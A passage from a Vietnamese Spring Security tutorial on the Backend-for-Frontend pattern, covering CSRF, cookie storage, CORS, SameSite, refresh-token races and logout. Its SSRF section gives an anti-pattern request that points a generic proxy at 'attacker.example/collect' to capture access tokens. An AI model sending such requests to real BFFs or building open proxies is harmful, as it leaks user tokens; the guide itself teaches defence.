Trong ví dụ SecurityFilterChain ở trên, `/api/csrf` yêu cầu Authentication vì `.anyRequest().authenticated()`. SPA gọi endpoint sau khi login. Muốn cho phép trước login, cần thêm matcher public nhưng vẫn phải giữ CSRF/session semantics.

**Lưu ý Spring Security 6:** Có deferred CSRF tokens và request handlers phục vụ BREACH protection. Cách lấy token từ request attribute do CsrfFilter đưa vào được hỗ trợ, nhưng nếu tùy biến custom handlers hoặc cookie CSRF repository, cần kiểm tra format khi JS gửi token qua header.

### 13.1. Frontend gọi endpoint CSRF

```javascript
async function loadCsrf() {
  const response = await fetch("/api/csrf", {
    credentials: "same-origin"
  });

  if (!response.ok) {
    throw new Error("Unable to load CSRF token");
  }

  return response.json();
}

async function cancelOrder(orderId) {
  const csrf = await loadCsrf();

  const response = await fetch(
    "/api/orders/" + encodeURIComponent(orderId) + "/cancel",
    {
      method: "POST",
      credentials: "same-origin",
      headers: {
        [csrf.headerName]: csrf.token
      }
    }
  );

  if (!response.ok) {
    throw new Error("Unable to cancel order");
  }

  return response.json();
}
```

JavaScript **không** dùng OAuth2 access token. Nó chỉ có:

- Browser session cookie được browser tự gửi.
- CSRF token mà backend cung cấp.
- JSON input và output nghiệp vụ.

### 13.2. CSRF token không thay origin policy

Khi có XSS, script độc hại chạy trên origin BFF có thể đọc CSRF token và thực hiện API calls. Vì vậy phải áp dụng CSP, output escaping, sanitize HTML đúng trường hợp và hạn chế third-party scripts.

CSRF token giúp chống **cross-site request forgery**, không phải chống malicious same-origin JavaScript.

### 13.3. CookieCsrfTokenRepository có thể là lựa chọn khác

Spring Security còn có:

```java
CookieCsrfTokenRepository.withHttpOnlyFalse()
```

thường được dùng khi SPA cần đọc **CSRF token cookie** và phản hồi token qua header phù hợp.

Đừng nhầm với session cookie HttpOnly hoặc OAuth2 token cookies. Cookie chứa CSRF token có thể phải readable theo kiến trúc frontend, còn **session ID phải HttpOnly** và OAuth2 tokens vẫn lưu backend.

Việc tùy biến CookieCsrfTokenRepository trong Spring Security 6 cần lưu ý deferred tokens, BREACH handler và cơ chế refresh CSRF token sau login/logout. Cách endpoint JSON ở trên đơn giản hơn để minh họa ranh giới.

---

## 14. Frontend gọi BFF mà không nhận access token

Một browser API call sau login:

```javascript
async function loadOrders() {
  const response = await fetch("/api/orders", {
    method: "GET",
    credentials: "same-origin",
    headers: {
      "Accept": "application/json"
    }
  });

  if (response.status === 401) {
    window.location.assign("/oauth2/authorization/corporate");
    return;
  }

  if (!response.ok) {
    throw new Error("Cannot load orders");
  }

  return response.json();
}
```

Ở đây:

- `credentials: "same-origin"` cho phép browser gửi cookie tới cùng origin.
- Không gọi `localStorage.getItem("access_token")`.
- Không tự thêm `Authorization: Bearer ...`.
- Backend sẽ quyết định token cần dùng cho Orders API.
- API response là dữ liệu nghiệp vụ, không phải token.

**Cẩn thận với redirect khi fetch:** Nếu endpoint trả 302 tới IdP trong một `fetch()` XHR, browser có thể không điều hướng trang chính như mong muốn, và có thể gặp CORS/HTML response. Trong ứng dụng SPA, nên thiết kế riêng **login navigation** và quy ước API 401/session-expired để frontend chủ động điều hướng tới `/oauth2/authorization/corporate`.

Một số ứng dụng dùng endpoint `/api/me` trả 401 khi chưa đăng nhập và HTML navigation GET khởi tạo OAuth2 Login. Hãy phân biệt kỳ vọng giữa **API call** và **top-level browser navigation**.

### 14.1. Không đặt raw token trong HTML bootstrap data

Anti-pattern:

```html
<script>
  window.ACCESS_TOKEN = "...";
</script>
```

Dù server tạo HTML, token đã trở thành dữ liệu JavaScript-accessible và không còn tuân thủ BFF boundary.

Có thể đưa **thông tin hiển thị tối thiểu** như display name hoặc feature flags sau khi đã escape/serialize an toàn, nhưng không đưa token hoặc cookie session ID.

---

## 15. Backend gọi Orders API với OAuth2AuthorizedClient

Một Spring MVC controller có thể nhận authorized client của user bằng:

```java
@RegisteredOAuth2AuthorizedClient("corporate")
OAuth2AuthorizedClient authorizedClient
```

Đây là object phía backend do OAuth2 Client infrastructure quản lý. Không trả object trực tiếp về JSON vì nó có thể chứa access/refresh tokens.

### 15.1. Ví dụ gọi downstream bằng RestClient

```java
import java.util.List;

import org.springframework.core.ParameterizedTypeReference;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.annotation.RegisteredOAuth2AuthorizedClient;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClient;

@RestController
public class OrdersController {

    private final RestClient ordersClient;

    public OrdersController(RestClient.Builder builder) {
        this.ordersClient = builder
            .baseUrl("https://orders.internal.example")
            .build();
    }

    @GetMapping("/api/orders")
    public List<OrderDto> orders(
            @RegisteredOAuth2AuthorizedClient("corporate")
            OAuth2AuthorizedClient authorizedClient) {

        return ordersClient.get()
            .uri("/v1/orders")
            .headers(headers ->
                headers.setBearerAuth(
                    authorizedClient.getAccessToken().getTokenValue()
                )
            )
            .retrieve()
            .body(new ParameterizedTypeReference<List<OrderDto>>() {});
    }

    public record OrderDto(String id, String summary) {
    }
}
```

Lưu ý:

- Ví dụ trình bày **ranh giới transport**: browser gửi session cookie tới BFF, BFF gửi Bearer access token tới API.
- `@RegisteredOAuth2AuthorizedClient` cần đúng registration/principal và authorized client infrastructure.
- Access token do AS cấp cho registration `corporate` **phải thật sự được Orders API chấp nhận** (audience/scope/issuer). Nếu không, dùng registration/authorization khác hoặc token exchange được provider hỗ trợ.
- Với Spring Security integration hiện đại, `RestClient`/`WebClient` có OAuth2 interceptors/filters để manager tự chọn và reauthorize authorized client. Việc gắn header thủ công trong ví dụ không tự xử lý token refresh.
- Nếu access token hết hạn, cần để manager/argument resolver xử lý reauthorization theo cấu hình hoặc tích hợp OAuth2 HTTP client phù hợp.
- DTO cần được lọc theo business policy; API B vẫn phải kiểm tra ownership.

### 15.2. Không nhận username từ query để load token

Sai:

```text
GET /api/orders?principalName=bob
```

rồi service thực hiện:

```java
authorizedClientService.loadAuthorizedClient(
    "corporate",
    principalNameFromQuery
);
```

Nếu không kiểm tra quyền, Alice có thể lấy token của Bob.

BFF phải dùng **authenticated principal** từ Spring Security và xác minh quyền nếu có nghiệp vụ hành động thay mặt người khác.

### 15.3. Không chuyển tiếp mọi inbound headers tới downstream

Không làm:

```text
BFF gửi tới Orders:
    Cookie: SESSION=...
    X-CSRF-TOKEN: ...
    Authorization: Browser-supplied-header
    Host: frontend-host
```

API downstream chỉ cần những headers phù hợp với hợp đồng: Bearer access token do BFF chọn, correlation ID không nhạy cảm, content type và các business headers được allowlist.

Đặc biệt, không chuyển BFF session cookie sang API khác.

---

## 16. Session cookie, localStorage, sessionStorage và IndexedDB

Các storage/browser features có semantics khác nhau.

| Nơi lưu | JavaScript cùng origin đọc được? | Browser tự gửi khi HTTP request? | Phù hợp giữ gì trong BFF? |
|---|---|---|---|
| HttpOnly session cookie | **Không** qua `document.cookie` | **Có**, theo cookie policy | Opaque session ID |
| Non-HttpOnly cookie | Có | Có | Có thể dùng cho CSRF token theo design, không OAuth tokens |
| `localStorage` | Có | Không | UI preferences không nhạy cảm, không OAuth tokens |
| `sessionStorage` | Có | Không | UI state không nhạy cảm, không OAuth tokens |
| IndexedDB | Có qua JS API | Không | Offline data có policy rõ, không refresh tokens |
| JavaScript memory | Có bởi code trong cùng execution realm | Không | UI data tạm, không BFF OAuth tokens |
| Backend authorized client DB/session | Không | Không | Access/refresh token, metadata |

Một session cookie HttpOnly không thể bị JS đọc trực tiếp, nhưng nó vẫn tồn tại trên máy người dùng và có thể được DevTools/browser internals hiển thị. Thuộc tính HttpOnly không phải mã hóa cookie.

### 16.1. Vì sao localStorage không phải phương án thay thế BFF?

Nếu app nhận OAuth2 access token rồi lưu:

```javascript
localStorage.setItem("access_token", token);
```

thì bản chất JavaScript vẫn là token holder. BFF có thể vẫn tồn tại như một gateway, nhưng **ranh giới lưu token backend-only đã bị phá vỡ**.

Nếu cần browser trực tiếp gọi API bằng OAuth2 access token, đó là một kiến trúc khác (SPA OAuth2 client hoặc token-mediating backend), cần threat model riêng.

---

## 17. CORS, same-origin và same-site trong BFF

Cách triển khai đơn giản nhất:

```text
https://portal.example.com/app
https://portal.example.com/api/orders
https://portal.example.com/oauth2/authorization/corporate
```

**Cùng origin** (scheme + host + port). Khi browser gọi `/api/orders`, không cần cross-origin CORS cho frontend–BFF boundary.

### 17.1. Frontend và BFF khác subdomain

Ví dụ:

```text
SPA: https://app.example.com
BFF: https://api.example.com
```

Hai URLs này **khác origin**, nhưng thường **same-site** nếu scheme và registrable domain phù hợp. Vì cross-origin, browser vẫn cần CORS rules cho `fetch`.

Có thể cần:

```javascript
fetch("https://api.example.com/api/orders", {
  credentials: "include"
});
```

Và BFF phải chỉ cho phép đúng origin của SPA, ví dụ:

```text
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Không sử dụng:

```text
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

vì credentialed CORS không hoạt động với wildcard và đây là policy nguy hiểm.

### 17.2. CORS không thay CSRF protection

CORS kiểm soát JavaScript của origin nào được đọc response cross-origin hoặc gửi một số loại requests. Nó không phải biện pháp CSRF đầy đủ với session cookies.

Ngay cả khi browser không cho một trang độc hại đọc response, một form POST hoặc request khác **vẫn có thể được gửi** theo policy browser và HTTP method/content-type.

Giữ CSRF validation và có thể bổ sung `Origin`/`Referer` checks cho state-changing operations.

### 17.3. Cookie host-only và subdomains

Nếu cookie BFF được phát tại `api.example.com` mà không có `Domain`, nó là **host-only cookie** cho API host. Browser có thể gửi cookie đó khi request tới `api.example.com`; JavaScript ở `app.example.com` không cần đọc cookie.

Đừng đặt `Domain=.example.com` chỉ để cho app subdomain thấy cookie. Việc mở domain cookie làm tăng phạm vi nơi cookie được gửi và nguy cơ từ subdomains khác.

### 17.4. Frontend nằm ở site khác hoàn toàn

Ví dụ:

```text
SPA: https://frontend.example.org
BFF: https://backend.example.net
```

Đây là cross-site. Cookie auth có thể cần `SameSite=None; Secure`, nhưng browser privacy policies có thể chặn third-party cookies; CSRF và CORS phức tạp hơn.

Với BFF phục vụ browser, ưu tiên **same-origin deployment qua reverse proxy** khi có thể. Không thiết kế phụ thuộc vào third-party cookies vô điều kiện.

---

## 18. `SameSite` và redirect callback của OIDC

OAuth2 Authorization Code Flow cần browser chuyển hướng:

```text
BFF -> Identity Provider -> BFF callback
```

BFF thường lưu **authorization request, state và PKCE verifier** tại backend, gắn với phiên hoặc một authorization request repository.

Nếu cookie phiên không được gửi về callback, BFF có thể không tìm thấy authorization request đã bắt đầu.

### 18.1. Callback GET

Với response mode `query`, IdP thường điều hướng top-level GET về:

```text
/login/oauth2/code/corporate?code=...&state=...
```

`SameSite=Lax` thường tương thích với top-level cross-site GET navigation, nên được dùng phổ biến trong kiến trúc redirect-based login.

### 18.2. Callback form_post

Một số OIDC Providers hỗ trợ `response_mode=form_post`, dẫn tới top-level cross-site POST.

Cookie `SameSite=Lax` có thể không được gửi với POST này, gây:

```text
authorization_request_not_found
invalid_state
Login callback cannot be correlated
```

Không giải quyết bằng cách bỏ qua `state`. Phải chọn response mode/cookie design/session flow tương thích và giữ các biện pháp CSRF.

### 18.3. Chuyển proxy và scheme sai

Nếu browser truy cập:

```text
https://portal.example.com
```

nhưng Spring Boot thấy nội bộ:

```text
http://bff:8080
```

và application không được cấu hình forwarded headers đúng cách, redirect URI có thể trở thành `http://...` hoặc sai host.

Cần:

- Reverse proxy được tin cậy.
- Cấu hình forwarding (`Forwarded`, `X-Forwarded-*`) chỉ từ proxy đáng tin.
- Redirect URI đã đăng ký chính xác tại IdP.
- HTTPS và Secure cookies nhất quán.
- Không tin forwarded headers tùy ý từ public internet.

---

## 19. XSS không bị BFF loại bỏ

BFF bảo vệ raw OAuth2 tokens khỏi JavaScript theo kiến trúc, nhưng malicious script chạy trong origin của SPA/BFF vẫn có thể:

- Gọi `/api/orders`, `/api/profile` bằng session cookie.
- Gửi POST `/api/orders` nếu lấy được CSRF token từ cùng origin.
- Đọc API response và exfiltrate dữ liệu.
- Thay đổi DOM và lừa người dùng.
- Tạo transactions khi backend không có additional authorization/step-up verification.

### 19.1. Những biện pháp cần giữ

- Output encoding và template escaping.
- Không render user-controlled HTML không được sanitize.
- Content Security Policy phù hợp, giảm inline scripts và uncontrolled script sources.
- Hạn chế third-party scripts/analytics có quyền chạy trong origin.
- Dependency supply-chain controls.
- Không đưa secrets vào JS bundles, source maps hoặc DOM.
- Validation/authorization tại backend, không tin frontend checks.
- Step-up authentication hoặc transaction confirmation cho thao tác nhạy cảm.

### 19.2. HttpOnly giảm token theft nhưng không ngăn session riding bởi XSS

Một đoạn script độc hại không đọc được `document.cookie` chứa HttpOnly session ID, nhưng vẫn có thể:

```javascript
fetch("/api/me", { credentials: "same-origin" });
```

Vì thế câu “BFF an toàn trước XSS” là sai. Đúng hơn:

> BFF giảm khả năng raw OAuth2 access/refresh token bị JavaScript đánh cắp, nhưng XSS vẫn có thể thực hiện các hành động mà session hiện tại được phép.

---

## 20. BFF phải tránh SSRF và token exfiltration qua proxy

Một lỗi kiến trúc thường gặp là dùng BFF làm proxy chung:

```text
POST /api/proxy
{
  "url": "https://attacker.example/collect",
  "method": "GET"
}
```

Nếu BFF lấy access token rồi gắn vào URL tùy ý, kẻ tấn công có thể nhận token.

### 20.1. Không dùng URL tự do từ browser

Chọn API upstream theo **server-side configuration**:

```java
RestClient ordersClient =
    RestClient.builder()
        .baseUrl("https://orders.internal.example")
        .build();
```

Controller cung cấp operation/parameters nghiệp vụ đã validate, không cung cấp toàn bộ URL upstream.

### 20.2. Chặn rủi ro từ redirects

Ngay cả khi base URL cố định, upstream có thể trả 302/307 đến host khác. Cần kiểm tra hành vi redirect của HTTP transport và policy forwarding `Authorization` headers.

Không giả định mọi `RestClient`, `WebClient` hoặc HTTP connector tự bảo vệ được token khi redirect.

### 20.3. Không forward cookie, Host và Authorization từ browser mù quáng

Thiết kế một allowlist headers riêng cho downstream. Ví dụ BFF có thể gửi:

```text
Authorization: Bearer <downstream-access-token>
Accept: application/json
X-Correlation-ID: <validated-id>
```

Nhưng không nên forward:

```text
Cookie: SESSION=...
X-CSRF-TOKEN: ...
Authorization: arbitrary browser value
X-Forwarded-Host: untrusted input
```

`Cookie` là credential của BFF session, không thuộc downstream API.

### 20.4. Không phản chiếu upstream `Set-Cookie` và token fields về browser

Nếu downstream response có `Set-Cookie`, `WWW-Authenticate`, token-like fields hoặc headers nhạy cảm, BFF phải quyết định có được truyền qua hay không. Đừng sao chép toàn bộ headers/body mù quáng rồi trả frontend.

BFF nên trả **DTOs đã được thiết kế**, không expose raw authorization infrastructure.

---

## 21. Server-side token storage có thể ở đâu?

Một BFF nhỏ có thể dùng HTTP session và InMemory authorized client store. Một BFF chạy nhiều instances thường cần lựa chọn rõ hơn.

### 21.1. Lưu trong memory một node

```text
Pod A
    Session A1
    OAuth2AuthorizedClient of Alice
```

Điều này đơn giản nhưng sau restart tokens/sessions có thể mất. Nếu load balancer chuyển requests sang pod B không cùng storage, Alice có thể bị coi là chưa đăng nhập hoặc không tìm được authorized client.

### 21.2. Spring Session Redis hoặc JDBC

Spring Session hỗ trợ thay thế container-managed `HttpSession` với storage chia sẻ.

Ví dụ về kiến trúc:

```text
Browser
    |
    | Cookie SESSION=opaque-id
    v
Load Balancer
    |
    +--> BFF Pod A ---+
    |                 |
    +--> BFF Pod B ---+--> Shared Spring Session Store
    |                 |
    +--> BFF Pod C ---+--> OAuth2AuthorizedClient Store
```

Khi BFF có nhiều pods, cần xét **cả hai nguồn dữ liệu**:

1. SecurityContext/HTTP session.
2. OAuth2AuthorizedClient (access/refresh tokens).

Có deployment dùng authorized client repository trong session, có deployment dùng authenticated-principal repository delegate sang service. Phải kiểm tra code/wiring thực tế để biết token nằm ở đâu.

### 21.3. Spring Session không tự mã hóa access token ở application layer

Redis/JDBC ở private network không tự làm dữ liệu token an toàn tuyệt đối.

Cần xem:

- TLS tới Redis/database.
- Authentication/ACL và network segmentation.
- Encryption at rest/backups, khi cần application-level encryption.
- Secret rotation và key management.
- Không log SQL parameters hoặc Redis values chứa token.
- Data retention/TTL và session cleanup.
- Tenant isolation.
- Backup/export access controls.

**Refresh token là credential dài hạn**, nên mức bảo vệ tại backend store cần tương xứng.

### 21.4. Shared storage cần độ sẵn sàng cao

Nếu session store hoặc authorized client DB ngừng hoạt động, BFF có thể không xác thực được phiên hoặc không lấy được token, dù Resource Server và IdP vẫn khỏe.

Cần chiến lược monitoring, timeout, connection pool, failover và graceful error handling. Không fallback bằng cách trả OAuth2 tokens cho browser để “tạm dùng”.

---

## 22. Cookie lifetime không bằng access token lifetime

Ví dụ:

```text
BFF Session:
    idle timeout = 30 phút

Access Token:
    lifetime = 10 phút

Refresh Token:
    lifetime/policy theo Authorization Server
```

Điều có thể xảy ra:

```text
09:00 Login -> session + access token AT1
09:08 Browser GET /api/orders -> AT1 còn hạn
09:12 Browser GET /api/orders -> AT1 hết hạn
       BFF refresh RT1 -> nhận AT2
09:20 Browser tiếp tục dùng cùng session cookie
09:35 Không còn activity trong 30 phút? phụ thuộc last access
       Session có thể hết hạn
```

**Session còn hạn không đồng nghĩa access token còn hạn.** BFF phải quản lý hai lifecycles.

Ngược lại, **session hết hạn không nhất thiết làm token ở Authorization Server bị revoke**. BFF cần chính sách logout/cleanup tương ứng.

### 22.1. Idle timeout và absolute timeout

Idle timeout dựa trên thời gian không hoạt động; absolute timeout giới hạn phiên kể từ lúc tạo hoặc xác thực bất kể hoạt động.

Spring Session/Servlet session thường cung cấp idle timeout; absolute lifetime nếu tổ chức yêu cầu có thể cần additional policy/custom implementation.

Chỉ dựa vào browser đóng tab không đảm bảo session và tokens bị thu hồi ngay.

### 22.2. Không tự tăng session lifetime theo refresh token

Việc backend refresh access token không bắt buộc kéo dài BFF session vô hạn. Session lifetime cần policy độc lập dựa trên rủi ro, user activity và yêu cầu reauthentication.

---

## 23. Refresh token rotation khi nhiều requests đồng thời

Một BFF thường nhận nhiều API requests song song từ cùng một SPA:

```text
Dashboard load:
  GET /api/me
  GET /api/orders
  GET /api/notifications
  GET /api/balance
```

Nếu access token gần hết hạn, nhiều threads/pods có thể cùng tìm authorized client cũ:

```text
AT1 hết hạn
RT1 hiện có

Request A -> refresh RT1 -> AT2 + RT2
Request B -> refresh RT1 -> invalid_grant
```

Nếu AS dùng **refresh token rotation** và replay detection, RT1 có thể bị vô hiệu hóa sau lần dùng đầu tiên. Request B dùng lại RT1 có thể gây lỗi, thậm chí khiến token family bị revoke theo policy.

### 23.1. Manager/service không mặc định lock toàn bộ refresh

`OAuth2AuthorizedClientManager`, `OAuth2AuthorizedClientProvider` và authorized client store hỗ trợ token lifecycle, nhưng không nên giả định chuỗi:

```text
load -> check expiry -> HTTP refresh -> save
```

được thực hiện atomic giữa mọi threads và pods.

### 23.2. Hướng xử lý

- Dùng **single-flight/per-key lock** cho mỗi authorized client khi cần.
- Khóa theo registration + principal + tenant/security namespace.
- Sau khi lấy lock, **load lại authorized client** để thấy token mới nếu request khác đã refresh.
- Với nhiều pods, cân nhắc distributed coordination.
- Dùng conditional write/delete hoặc versioning để tránh stale failure xóa entry mới.
- Không retry refresh token đã rotate một cách mù quáng.
- Không log refresh tokens.

### 23.3. Default `invalid_grant` failure handler

Một số authorized client managers mặc định xóa stored authorized client khi gặp `invalid_grant`. Nếu request B thất bại với RT1 cũ ngay sau khi A lưu RT2, việc xóa entry theo key có thể vô tình xóa token mới.

Trong hệ thống có rotation strict, phải thiết kế concurrency và failure handling theo thứ tự cập nhật thực tế. **Không tắt failure handling vô điều kiện**, vì refresh token thực sự không hợp lệ vẫn cần được xử lý.

### 23.4. `clockSkew`

Refresh provider có thể coi token là “gần hết hạn” trước `expiresAt` một khoảng, thường cấu hình qua `clockSkew`.

Điều này giảm rủi ro API nhận token đã hết hạn nhưng không phải lock. Skew quá lớn so với lifetime có thể làm tăng refresh frequency và concurrency pressure.

---

## 24. User logout: session invalidation và token revocation khác nhau

Khi người dùng nhấn Logout:

```text
Browser
    |
    | POST /logout + CSRF token
    v
BFF
    |
    +-- Invalidate BFF session
    +-- Clear Authentication
    +-- Expire browser session cookie
    +-- Remove/revoke authorized clients theo policy
    +-- Có thể điều hướng tới OIDC Provider logout
```

Không nên sử dụng GET logout cho state-changing operation nếu không có lý do/chính sách rõ; Spring Security có logout behavior khác nhau khi CSRF bật.

### 24.1. BFF session logout

Spring Security logout handler có thể:

- Invalidate HTTP session.
- Clear SecurityContext/Authentication.
- Hỗ trợ xóa cookie.

Tuy nhiên, cookie name thực tế (`JSESSIONID`, `SESSION` hoặc custom) phụ thuộc container và Spring Session.

### 24.2. Xóa session không đồng nghĩa revoke refresh token

`OAuth2AuthorizedClient` có thể được lưu trong JDBC service độc lập với HTTP session. Nếu chỉ invalidate session, access/refresh tokens trong authorized client service **có thể vẫn còn**.

Cần quy định:

- Có remove authorized client khi user logout không?
- Có revoke refresh token theo RFC 7009 khi AS hỗ trợ không?
- User disconnect một app integration khác gì logout BFF?
- Provider có phát refresh token mới khi rotate không?
- Có cần revoke mọi sessions của user hay chỉ một device session?

### 24.3. OIDC RP-Initiated Logout

OIDC có cơ chế RP-Initiated Logout tùy OP hỗ trợ. Trong Spring Security có thể dùng `OidcClientInitiatedLogoutSuccessHandler` với `ClientRegistrationRepository` khi phù hợp.

Nhưng:

- BFF session logout **khác** OP SSO session logout.
- OP logout không mặc định revoke mọi OAuth2 access/refresh tokens.
- Browser SSO session còn tồn tại có thể khiến login tiếp theo diễn ra rất nhanh.
- Single Logout/front-channel/back-channel logout cần chính sách và hỗ trợ provider riêng.

### 24.4. Thao tác refresh đang chạy khi logout

Race nguy hiểm:

```text
Thread A: Refresh RT1...
Thread B: User logout, remove authorized client...
Thread A: Nhận RT2, save lại authorized client.
```

Token có thể “hồi sinh” sau logout. Đối với yêu cầu bảo mật cao, dùng version/tombstone hoặc concurrency coordination để đảm bảo một refresh response đến muộn không tái kích hoạt authorization đã bị thu hồi.

---

## 25. “BFF” và “Token-Mediating Backend” khác nhau thế nào?

Có những kiến trúc backend hỗ trợ OAuth2 cho SPA nhưng vẫn **cấp access token cho browser**.

### 25.1. Token-Mediating Backend

Backend thực hiện một phần flow OAuth2 rồi cung cấp access token cho SPA. SPA sau đó gửi Bearer token trực tiếp tới Resource Server.

```text
Browser -> Backend: Login/session
Backend -> Browser: Access token
Browser -> Resource Server: Bearer access token
```

Điểm này **khác BFF giữ token backend-only**, vì OAuth2 access token đã trở thành JavaScript-accessible.

### 25.2. BFF đầy đủ

```text
Browser -> BFF: Session cookie + API request
BFF -> Resource Server: Bearer access token
BFF -> Browser: Business JSON
```

Không có raw OAuth2 token được trả browser.

### 25.3. Trade-offs

| Tiêu chí | BFF backend-only tokens | Token-Mediating Backend |
|---|---|---|
| JS nhận access token? | Không | Có |
| BFF phải proxy tất cả protected API calls? | Thường có | Không nhất thiết |
| Rủi ro JS exfiltrate access token? | Giảm mạnh | Vẫn tồn tại |
| Backend traffic/latency | Tăng do proxy API | Có thể giảm |
| Browser/API CORS | Frontend–BFF có thể same-origin | SPA–API thường cần CORS |
| Session-cookie CSRF | Cần phòng vệ | Phụ thuộc cách browser gọi backend |
| API token audience | Chọn ở backend | Browser cũng phải chọn đúng API |

Cần gọi đúng mô hình trong kiến trúc và tài liệu. Một backend “giúp lấy token” nhưng trả token cho SPA không đạt mục tiêu **không expose token ra browser** của BFF.

---

## 26. BFF trong kiến trúc nhiều frontend

Một tổ chức có thể có:

```text
Web App A -> BFF A
Web App B -> BFF B
Mobile App -> Mobile API
```

Không nhất thiết tất cả clients phải dùng cùng một kiểu authentication.

### 26.1. Browser-facing BFF

Phù hợp khi website cần cookie session, không muốn JS giữ OAuth2 tokens và có backend riêng phục vụ UI.

### 26.2. Native mobile app

Mobile app thường dùng Authorization Code with PKCE với system browser và secure platform token storage theo OAuth2 native app guidance. Không nên giả lập “browser HttpOnly cookie là đáp án cho mọi native app” mà bỏ qua platform security model.

### 26.3. Server-rendered app

Một Spring MVC app server-rendered HTML đã có server session và OAuth2 Login có thể thực hiện **rất nhiều đặc tính BFF** một cách tự nhiên, dù không có SPA độc lập.

### 26.4. Microfrontends

Nếu nhiều microfrontends cùng chạy trong một origin BFF, hãy lưu ý:

- Third-party scripts có thể chạy với cùng-origin privileges.
- XSS ở một microfrontend có thể thực hiện BFF API calls thuộc các phần khác nếu backend authorization quá rộng.
- Không dùng frontend module name làm security boundary.
- Backend kiểm tra quyền theo user/tenant/resource.
- Cần CSP, dependency isolation và hạn chế quyền endpoints.

---

## 27. Spring WebFlux BFF có gì khác?

Cùng mô hình browser–BFF–Resource Server vẫn áp dụng cho WebFlux, nhưng những classes khác.

| Mối quan tâm | Servlet/MVC | WebFlux |
|---|---|---|
| Security config | `HttpSecurity` | `ServerHttpSecurity` |
| Security chain | `SecurityFilterChain` | `SecurityWebFilterChain` |
| Security context | Servlet security repositories/HttpSession | `ServerSecurityContextRepository` + Reactor Context |
| Principal access | `SecurityContextHolder`, controller arguments | `ReactiveSecurityContextHolder`, reactive principal |
| Authorized client manager | `OAuth2AuthorizedClientManager` | `ReactiveOAuth2AuthorizedClientManager` |
| Authorized client repository | `OAuth2AuthorizedClientRepository` | `ServerOAuth2AuthorizedClientRepository` |
| Client service | `OAuth2AuthorizedClientService` | `ReactiveOAuth2AuthorizedClientService` |
| Downstream HTTP | `RestClient`/`WebClient` | `WebClient` non-blocking |
| Session | `HttpSession`/Spring Session | `WebSession`/Spring Session reactive integrations |

Một WebFlux BFF vẫn cần:

- Cookie session security.
- CSRF protection.
- OIDC Login Authorization Code Flow.
- Backend-only token storage.
- Authorized client reauthorization.
- API proxy allowlists và SSRF defense.
- Distributed session/token lifecycle controls.

Không chỉ đưa reactive OAuth2 client filter vào WebClient rồi gọi đó là BFF nếu browser vẫn nhận raw tokens.

### 27.1. Không block Reactor event loop

Trong WebFlux, avoid `.block()`/blocking HTTP clients trên event loop. Sử dụng reactive authorized client manager và WebClient pipeline đúng kiểu.

### 27.2. Reactor Context không lưu token vĩnh viễn

`ReactiveSecurityContextHolder` giúp code đọc Authentication trong một subscription; nó **không phải persistent OAuth2 token vault** và không thay `ReactiveOAuth2AuthorizedClientService` hay session repository.

---

## 28. API authentication và BFF session là hai lớp khác nhau

Một hệ thống có thể cho browser dùng session cookie tới BFF, trong khi Resource Server nội bộ chỉ chấp nhận OAuth2 Bearer tokens.

```text
Browser -> BFF:
    Cookie: SESSION=...

BFF -> API:
    Authorization: Bearer AT1
```

Đây là hai trust boundaries và hai bộ security controls.

### 28.1. BFF endpoint `/api/orders`

Kiểm tra:

- Browser session hợp lệ.
- User Authentication có được phép truy cập route.
- Requested order thuộc user/tenant hay không.
- Input validation và rate limits.

### 28.2. Orders Resource Server

Kiểm tra:

- Token issuer.
- Signature/introspection.
- Audience.
- Expiration.
- Scopes/authorities.
- Resource ownership/business policy.

**Không bỏ security ở Orders API chỉ vì BFF đã đăng nhập user.** BFF có thể bị lỗi hoặc một service khác cũng gọi API.

### 28.3. Không tự đổi user token sang client credentials khi bị 403

Nếu BFF dùng user-delegated token và nhận 403 do scope/ownership, không tự fallback sang privileged service token để trả dữ liệu.

Điều đó tạo nguy cơ confused deputy và privilege escalation. Nếu API cần application permission cho một nghiệp vụ đã được user cho phép, phải thiết kế policy rõ ràng.

---

## 29. Xử lý response status trong BFF

BFF cần phân biệt lỗi của **phiên browser**, **Token Endpoint** và **Resource Server**.

| Nguồn lỗi | Ví dụ | Hành vi BFF phù hợp |
|---|---|---|
| BFF session hết hạn | Không có Authentication hợp lệ | API trả 401 hoặc response type đã định nghĩa; frontend điều hướng login |
| CSRF invalid | Thiếu/sai CSRF token | 403; frontend lấy lại token nếu policy phù hợp, không tắt CSRF |
| OAuth2 callback `state` sai | Invalid state/authorization request not found | Từ chối callback; không bỏ validation |
| Token Endpoint `invalid_grant` | Refresh token expired/revoked/rotate race | Loại bỏ/invalidate authorized client theo policy, có thể yêu cầu reconnect |
| Token Endpoint `invalid_client` | Client secret/mTLS sai | Backend alert; không hiển thị secret |
| Resource Server 401 `invalid_token` | Token stale, revoke hoặc issuer/audience sai | Phân loại lỗi; có thể reauthorize giới hạn, không loop vô hạn |
| Resource Server 403 | Insufficient scope/business authorization | Trả lỗi đúng policy, không dùng token mạnh hơn |
| Resource Server 429 | Rate limiting | Backoff và rate control |
| Resource Server 5xx | Upstream unavailable | 502/503 theo contract API, giữ correlation ID |
| Session DB/Redis lỗi | Không load phiên/token | Thông báo lỗi server-side; không fallback expose token |

### 29.1. Không trả raw OAuth2 errors chứa token

Token Endpoint errors hoặc exception messages có thể kèm request metadata. Không serialize toàn bộ exception object, auth context hoặc token response về browser.

Dùng problem response/body đã được kiểm soát:

```json
{
  "code": "SESSION_EXPIRED",
  "message": "Please sign in again"
}
```

Log server-side nên chứa correlation ID và mã lỗi đã redacted, không chứa raw credentials.

---

## 30. Session expiration và UX cho SPA

Một SPA có thể mở hàng giờ không reload. Khi BFF session hết hạn:

```text
GET /api/orders
    -> 401 SESSION_EXPIRED
```

Frontend nên điều hướng người dùng tới login hoặc hiển thị trạng thái cần xác thực, **không** tự lấy access token từ browser vì browser không giữ token đó.

### 30.1. Giữ API response và browser navigation rõ ràng

Một API call kỳ vọng JSON không nên âm thầm nhận một trang HTML của IdP qua 302 redirect chain. Có thể cấu hình authentication entrypoint/exception handling cho `/api/**` trả 401, còn top-level navigation tới login URL kích hoạt OAuth2 authorization.

Đây là một hợp đồng frontend–BFF quan trọng để tránh CORS lỗi khó hiểu khi phiên hết hạn.

### 30.2. Không đặt session expiry dựa chỉ vào frontend timer

